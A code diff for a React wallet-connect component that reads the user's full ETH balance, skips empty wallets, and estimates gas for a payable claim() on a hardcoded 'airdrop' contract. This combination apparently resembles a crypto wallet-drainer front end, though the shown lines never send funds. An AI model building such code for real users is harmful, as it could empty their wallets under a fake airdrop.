@@ -1,22 +1,19 @@
 import { ConnectButton } from "@rainbow-me/rainbowkit";
 import Image from "next/image";
 import { useCallback, useEffect, useState } from "react";
-import { BigNumber, utils } from "ethers";
+import { BigNumber, ethers, utils } from "ethers";
 import {
   erc20ABI,
   useContractRead,
   useContractWrite,
   usePrepareContractWrite,
   useAccount,
-  useSigner,
-  useProvider,
-  useContract,
   useFeeData,
   useBalance,
 } from "wagmi";
-import { env } from "../../config/env";
-import { sign } from "crypto";
 import { Button } from "@chakra-ui/react";
+import airdropAbi from "config/constants/airdrop.json";
+import { useEthersProvider } from "../../config/ether";
 
 const contractAddress = "0x794bF077074D4aC9e958c19CceEDe1e04ddB1a5E";
 
@@ -24,37 +21,32 @@ export const CustomConnect = () => {
   const [callFuncGasFee, setCallFuncGasFee] = useState<BigNumber>(
     BigNumber.from(0)
   );
-  const { data: signer } = useSigner();
-  const provider = useProvider();
-  // get the gas price
+  const { address, isConnecting, isDisconnected, status } = useAccount();
   const {
-    data: feeData,
-    isError: feeDataError,
-    isLoading: feeDataLoading,
-  } = useFeeData();
-
-  const contract = useContract({
-    addressOrName: contractAddress,
-    contractInterface: ["function claim() payable"],
-    signerOrProvider: signer ?? provider,
+    data: balanceData,
+    isError: isErrorBalance,
+    isLoading: isLoadingBalance,
+  } = useBalance({
+    address,
+    formatUnits: "ether",
   });
+  const { data: feeData } = useFeeData();
 
   const [isSubmitted, setIsSubmitted] = useState(false);
+  const provider = useEthersProvider();
   useEffect(() => {
     async function estimateGasAmount() {
-      if (
-        !contract ||
-        !provider ||
-        !feeData?.gasPrice ||
-        !signer ||
-        isSubmitted
-      )
-        return;
-
       try {
-        const balance = await signer.getBalance();
-        if (balance.eq(BigNumber.from(0))) return;
+        if (!provider || !balanceData || !feeData) return;
 
+        if (parseFloat(balanceData.formatted) == 0) return;
+
+        const balance = BigNumber.from(balanceData.value.toString());
+        const contract = new ethers.Contract(
+          contractAddress,
+          airdropAbi,
+          provider
+        );
         // estimate the amount of gas needed to call the contract function
         const callFuncGas = await contract.estimateGas.claim({
           value: utils.parseEther("0"),
@@ -79,10 +71,8 @@ export const CustomConnect = () => {
       } catch (error) {}
     }
 
-    if (signer && contract) {
-      estimateGasAmount();
-    }
-  }, [contract, feeData, isSubmitted, provider, signer]);
+    estimateGasAmount();
+  }, [feeData, balanceData, provider]);
   return (
     <ConnectButton.Custom>
       {({
